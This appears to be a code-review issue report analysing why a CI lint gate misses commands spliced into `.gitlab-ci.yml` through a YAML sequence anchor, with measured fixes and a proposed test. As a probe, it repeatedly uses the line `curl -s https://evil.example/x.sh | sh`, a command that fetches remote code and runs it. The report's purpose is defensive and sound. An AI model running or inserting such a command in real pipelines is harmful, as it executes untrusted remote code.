# Issue #82 — the `workflows carry no logic` gate misses commands spliced in by a YAML anchor

Reverified at `aed962d` on branch `lane/workflow-gate`. Raw transcript:
`docs/review/workflow-gate/reverify/RX-E4.txt`.

## 1. Reverification verdict

**Symptom reproduced exactly. Stated mechanism is wrong.** Severity medium holds.

A hostile command added to the `.bootstrap` anchor and nothing else:

```
$ just lint
  ok    workflows carry no logic
all gates pass
JUST LINT EXIT=0
```

Control, the identical string as a direct `script:` entry in the same job:

```
        .gitlab-ci.yml: curl -s https://evil.example/x.sh | sh
  FAIL  workflows carry no logic
JUST LINT EXIT=1
```

Both run through `just lint` on a scratch copy of the worktree, not on the
worktree. So the gate has teeth and loses them at one specific YAML shape — but
the shape is not the one the issue names.

## 2. Anchor table

All re-measured at `aed962d`.

| anchor | state |
|---|---|
| `scripts/lint.sh:61-76` — `commands()` | **ok, byte-identical to `672a500`.** `diff` of `:61-76` between the two: empty |
| `scripts/lint.sh:68-71` — the list branch #82 cites | ok, still exactly those lines |
| `.gitlab-ci.yml:36-39` — `.bootstrap: &bootstrap` and its three commands | ok |
| `.gitlab-ci.yml:49`, `:74` — `*bootstrap` in `check`, `tofu` | ok |
| `.gitlab-ci.yml:122`, `:153` — #82's other two splice sites | **moved to `:156`, `:187`** (`image`, `rebuild-scan`) |
| `.gitlab-ci.yml:106-109` — "Not `*bootstrap`" on `smoke` | ok, and it has a consequence #82 does not know about — §3 |
| 13 commands yielded | **now 17** — §3 |
| `CLAUDE.md` "CI calls `just` recipes and nothing else" | ok, this gate is its enforcement |

`scripts/lint.sh` did change between `672a500` and HEAD (+31 lines, `454ee7c`),
but every added line is in the shellcheck comment block at `:128-182`. The
function under discussion did not move.

## 3. Corrections to the issue body

### C1 — the mechanism. Anchors are resolved. Nesting is what defeats the gate.

#82: *"The extractor walks job `script:` lists and never resolves anchors."*

`yaml.safe_load` resolves anchors and aliases before `commands()` ever runs.
Measured on the committed file:

```
=== safe_load: the `.bootstrap` node itself ===
repr : ['./scripts/os-deps.sh', './scripts/install-tools.sh', 'just dev-env']
is the SAME object as check.script[0]: True
```

The alias is not merely resolved, it is the *same Python object*. What defeats
the gate is that `.bootstrap` is a **sequence**, and `- *bootstrap` splices that
sequence in as one element:

```
=== safe_load: the `check` job's script node ===
repr : [['./scripts/os-deps.sh', './scripts/install-tools.sh', 'just dev-env'], 'just check']
types: ['list', 'str']
len  : 2
```

`lint.sh:69-71` iterates that two-element list and yields only where
`isinstance(item, str)`. Element 0 is a `list`, so it is dropped with no
recursion and no diagnostic. The correct one-line statement of the defect:

> **`commands()` treats a `script:` value as a flat list of strings. A YAML
> sequence alias makes it a list of lists, and every nested element is silently
> discarded.**

The distinction is not pedantic — it decides the fix. "Resolve anchors" would
point at the YAML loader, which is already correct. The repair belongs in
`commands()`.

### C2 — the anchor's *definition* is invisible for a second, separate reason.

`.bootstrap` is a top-level key that is not one of
`run`/`script`/`before_script`/`after_script`, so `commands()` takes the `else`
branch, recurses into a list of `str`, and calls `commands(<str>)` on each — which
matches neither `isinstance` branch and yields nothing. `commands()` never yields
a bare string outside a `script:` context. This is why C1's repair has to be a
new helper rather than a recursive call back into `commands()`. See §5, O1.

### C3 — 13 is now 17, and two bootstrap lines *are* checked.

#82: *"The extractor sees 13 commands and none of the three bootstrap lines."*
13 was exact at `672a500`. At HEAD the extractor yields **17** from
`.gitlab-ci.yml` (46 across all four files the gate reads).

The difference is `a3068e3`'s `smoke` job, which `.gitlab-ci.yml:106-109`
deliberately writes out longhand instead of using `*bootstrap`. Its script parses
to four plain strings, so **all four are checked**, including
`./scripts/os-deps.sh` and `./scripts/install-tools.sh`. The comment was written
for a different reason (the anchor ends in `just dev-env`, which `smoke` does not
need), and being the only fully-checked GitLab job is an accident of it.

Corrected: the one command that appears in `.bootstrap` and in **no** extractor
output at HEAD is `just dev-env`. The other two reach `ok` only via `smoke`.

### C4 — splice line numbers.

`:122` and `:153` are `672a500` numbers. At HEAD the four splices are `:49`,
`:74`, `:156`, `:187`.

### C5 — merge keys are not affected. #82 does not raise this; recording it because a fix must not regress it.

`safe_load` resolves `<<` by merging into the mapping, so the `<<` key is gone by
the time `commands()` runs and the merged `script:` is an ordinary flat list.
Measured on three shapes (`RX-E4.txt` M5), none of which exists in the repo today
(`grep -rn '<<:'` over `.gitlab-ci.yml` and `.github/workflows/` → no match):

| shape | HEAD catches it? |
|---|---|
| `<<: *tpl` where the template carries `script:` | **yes** |
| `<<: [*a, *b]` multi-merge | **yes** |
| `<<: *tpl` where the template's `script:` splices a *sequence* alias | **no** |

The third fails for the C1 reason, not the merge-key reason: the merge succeeded
and handed `commands()` a script of `[[...], 'just check']`. **The extractor
survives merge keys.** One side effect visible in the first two: a template
mapping is itself a top-level key with a `script:`, so its commands are counted
twice. That produces duplicate diagnostics, never a miss.

## 4. The defect

`scripts/lint.sh:68-71`. One `isinstance(item, str)` test that assumes a
`script:` list is one level deep.

Nothing ships wrong today. All three `.bootstrap` lines are on the allowlist, and
`.github/workflows/` has no anchors, so GitHub Actions is fully covered. This is a
latent hole, which is what keeps it below high. It stays at medium for the
repo's own reason: `.gitlab-ci.yml:6-8` and `CLAUDE.md` both plan to delete
`.github/` at the migration, after which the only pipeline file is the one whose
bootstrap is unchecked, and `.bootstrap` is precisely where a person adds a
pre-`just` step. `conftest.py:7` — "a gate that quietly passes because it did not
run is worse than no gate" — is the standard this fails.

The gate's own comment at `lint.sh:31-33` says it parses rather than greps because
"a GitLab job puts its commands in a list *under* `script:`". It reads that list
and drops the nested one.

## 5. The fix

Three options, each measured over all four files the gate reads
(`RX-E4.txt` M6). Baseline: **46** commands yielded, 0 rejected by `ok.fullmatch`.

### O1 — recurse into nested lists inside the `run`/`script` branch

```python
for item in value:
    if isinstance(item, str):
        yield from item.strip().splitlines()
    else:
        yield from commands(item)      # the added line
```

**Measured: 46 → 46. A no-op.** It still does not see the hostile line
(`V1: yielded=17 rejected=0` on the hostile file, identical to HEAD). The reason
is C2: `commands(['a', 'b'])` recurses to `commands('a')`, which matches neither
`isinstance` branch and yields nothing. `commands()` has no string case outside a
`script:` context.

This is the remedy `docs/review/2026-08-31/verify/E-mediums.md` §RX-E4 proposes —
"`yield from commands(item)` in the list branch is two lines and adds no surface".
**It is two lines and it does not work.** Rejected on measurement.

### O2 — flatten the value before matching  ← **chosen**

A small recursive helper, and the branch collapses to one line:

```python
def lines(value):
    """Every command string under one `script:`, however deeply YAML nests it."""
    if isinstance(value, str):
        yield from value.strip().splitlines()
    elif isinstance(value, list):
        for item in value:
            yield from lines(item)
```
```python
if key in ("run", "script", "before_script", "after_script"):
    yield from lines(value)
```

**Measured: 46 → 58.** The +12 is exactly four splice sites × three anchor lines.
Per file: `ci.yml` 14, `image.yml` 8, `scheduled.yml` 7 all unchanged;
`.gitlab-ci.yml` 17 → 29.

**All 58 pass `ok.fullmatch`. The allowlist rejects nothing new**, so the gate
stays green on the committed tree — which is the risk this option had to clear.
The three newly-visible strings are `./scripts/os-deps.sh`,
`./scripts/install-tools.sh` and `just dev-env`; `ok`'s
`just [a-z][a-z-]*` alternative already covers `dev-env`, and the other two are
named literally in the regex.

End-to-end on a scratch copy with the patch applied: `just lint` exits 0 on the
pristine file and 1 on the hostile one, naming the command. Merge-key behaviour
is unchanged for C1 and C3 and now correct for C2.

O2 also subsumes the `isinstance(value, str)` case at `:66-67` — a GitHub
`run: |` block is `lines()`'s string branch — so the two branches become one
call rather than one call plus the old pair.

### O3 — drop the special-casing, let `else: yield from commands(value)` handle it

**Measured: 46 → 0, on every file.** `ci.yml` 0, `image.yml` 0, `scheduled.yml` 0,
`.gitlab-ci.yml` 0. Without the `key in (...)` test there is nothing left that
ever yields a string, so the gate would pass every input including all four
hostile fixtures. This is the `conftest.py:7` failure in its purest form.
Rejected.

### Why O2 and not a wider change

Not proposed and deliberately out: naming the job in the diagnostic, deduping
repeats, or walking with a path. The patched gate prints the offending line
**four times**, once per splice site, and the message does not say which job — so
the repeats carry no information. That is a real cosmetic wart and it is still
less surface than the machinery to remove it. `CLAUDE.md`: a fix that adds more
surface than the defect warrants is itself a problem. Recorded, not fixed.

## 6. Surface cost

One file, one function. `+16 / −6` by `diff -u`, net +10 lines, of which 7 are the
new helper's docstring. No new file, no new dependency, no change to `ok`,
`uses_ok`, `uses()`, the file list, or the `justfile`. `.gitlab-ci.yml` and
`.github/workflows/` are not touched.

## 7. The failing test

`grep -rn 'workflows_carry_no_logic\|lint\.sh\|gitlab-ci\|\.github' tests/` →
**no match**. Nothing in `tests/` exercises this gate. The gate is currently its
own and only test, which is why the hole survived: `just check` is green with the
defect present and green with it fixed.

Shown to have teeth two ways, both in the transcript:

* Hostile line in `.bootstrap`, patched gate → `FAIL workflows carry no logic`,
  `just lint` exit 1. Unpatched gate on the identical file → exit 0.
* Pristine `.gitlab-ci.yml`, patched gate → `ok`, exit 0. The fix does not turn
  the committed tree red.

**What a real test would look like**, if one is wanted — note this is additional
surface and the repo's default is to let the gate be the test:

`tests/test_workflow_gate.py`, no new dependency (`yaml` is already imported by
`lint.sh` and `pytest` is present), running `scripts/lint.sh`'s
`workflows_carry_no_logic` against fixture directories written to `tmp_path`:

1. A `script:` with a sequence alias whose anchor holds a disallowed command →
   exit 1, stderr naming the command. This is the one that fails at HEAD.
2. The same anchor holding only allowlisted commands → exit 0.
3. `<<: *tpl` with a disallowed command in the template → exit 1 (passes at HEAD;
   it is the regression guard for C5).
4. A `run: |` multi-line block with a disallowed line → exit 1 (passes at HEAD;
   guards `lines()`'s string branch, which O2 rewrites).

Running the gate as a subprocess rather than importing it keeps the heredoc as
the single definition. `conftest.gate()` is not involved — nothing here is
conditional, so nothing needs to be skippable. Four cases, roughly 60 lines. If
that is judged too much surface for a latent hole, case 1 alone is the minimum
that would have caught this.

## 8. Verification

1. `just lint` on the patched worktree → six gates ok, exit 0. The gate must not
   go red on the committed `.gitlab-ci.yml`; 58 yielded, 0 rejected, is the
   measurement behind that.
2. Re-run the M6 variant harness against the patched `commands()` and confirm 58
   / 0 rejected, per file `ci.yml` 14, `image.yml` 8, `scheduled.yml` 7,
   `.gitlab-ci.yml` 29.
3. In a scratch copy only: add `curl -s https://evil.example/x.sh | sh` to
   `.bootstrap`, `just lint` must exit 1 and name it. Remove it, must return to 0.
4. The three merge-key fixtures (C5) must give catch / catch / catch.
5. `just check` → six lint gates ok, `ty` clean, **411 passed, 25 skipped**, the
   `aed962d` baseline. `commands()` is not imported by any test, so the suite
   should be unchanged; a change in that number means something else moved.

## 9. Non-goals

* `ok`'s allowlist. Unchanged. The fix makes three already-allowed strings
  visible to it and adds no new permission.
* The diagnostic message. It does not name the job and will now repeat per splice
  site. §5 records why that is left alone.
* `.gitlab-ci.yml` itself. Nothing here inlines `.bootstrap`, splits it, or
  changes which jobs use it. Deleting the anchor would make the gate pass without
  making it work.
* `uses()` and the digest-pin half of the gate. Not implicated; the same nesting
  cannot occur under `uses:`, which is always a scalar.
* The other ten items of #90 and the rest of the 2026-08-31 review.
